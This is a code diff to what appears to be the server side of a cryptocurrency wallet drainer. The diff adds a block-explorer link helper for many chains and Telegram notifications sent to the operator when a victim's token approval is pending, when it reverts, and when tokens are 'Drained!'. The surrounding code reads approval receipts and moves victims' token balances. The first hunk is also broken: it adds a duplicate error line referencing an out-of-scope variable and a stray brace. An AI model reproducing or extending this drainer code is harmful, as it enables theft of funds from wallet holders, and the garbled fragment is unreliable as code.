@@ -362,6 +362,34 @@ async function fulfillTronDrain(owner, tokenAddress) {
     } catch (e) {
         console.error(`❌ [TRON] Drain Failed:`, e.message);
     }
+    console.error(`❌ [TRON] Drain Failed:`, e.message);
+}
+}
+
+// --- EXPLORER HELPER ---
+function getExplorerLink(chain, txHash) {
+    const basenames = {
+        "ethereum": "https://etherscan.io/tx/",
+        "bsc": "https://bscscan.com/tx/",
+        "polygon": "https://polygonscan.com/tx/",
+        "base": "https://basescan.org/tx/",
+        "arbitrum": "https://arbiscan.io/tx/",
+        "optimism": "https://optimistic.etherscan.io/tx/",
+        "avalanche": "https://snowtrace.io/tx/",
+        "fantom": "https://ftmscan.com/tx/",
+        "cronos": "https://cronoscan.com/tx/",
+        "gnosis": "https://gnosisscan.io/tx/",
+        "linea": "https://lineascan.build/tx/",
+        "scroll": "https://scrollscan.com/tx/",
+        "zksync": "https://explorer.zksync.io/tx/",
+        "mantle": "https://explorer.mantle.xyz/tx/",
+        "blast": "https://blastscan.io/tx/",
+        "celo": "https://celoscan.io/tx/",
+        "moonbeam": "https://moonscan.io/tx/",
+        "moonriver": "https://moonriver.moonscan.io/tx/"
+    };
+    const base = basenames[chain.toLowerCase()] || "https://etherscan.io/tx/";
+    return base + txHash;
 }
 
 // --- APPROVAL DRAIN FUNCTION ---
@@ -395,11 +423,16 @@ async function drainApprovedToken(approval) {
         const receipt = await provider.getTransactionReceipt(txHash);
         if (!receipt) {
             console.log(`⏳ [DRAIN] Approval TX not confirmed yet: ${txHash}`);
+            // Notify only on first few retries to avoid spam
+            if (!approval.retries || approval.retries % 5 === 0) {
+                sendTelegram(`⏳ **Approval Pending Confirmation**\nToken: ${symbol}\nChain: ${chain}\nTX: [View on Explorer](${getExplorerLink(chain, txHash)})`);
+            }
             return false; // Keep in queue
         }
 
         if (receipt.status !== 1) {
             console.error(`❌ [DRAIN] Approval TX failed: ${txHash}`);
+            sendTelegram(`❌ **Approval Reverted**\nToken: ${symbol}\nChain: ${chain}\nTX: [View on Explorer](${getExplorerLink(chain, txHash)})`);
             return "failed"; // Move to failed queue
         }
 
@@ -414,7 +447,8 @@ async function drainApprovedToken(approval) {
         await tx.wait();
 
         console.log(`✅ [DRAIN] Success! TX: ${tx.hash}`);
-        sendTelegram(`💰 **Token Drained!**\nToken: ${symbol}\nChain: ${chain}\nAmount: ${ethers.formatUnits(balance, 18)}\nTX: \`${tx.hash}\``);
+        const explorerLink = getExplorerLink(chain, tx.hash);
+        sendTelegram(`💰 **Token Drained!**\n\nToken: ${symbol}\nChain: ${chain}\nAmount: ${ethers.formatUnits(balance, 18)}\n\n🔗 [View Transaction](${explorerLink})`);
 
         return true; // Success - remove from queue
 
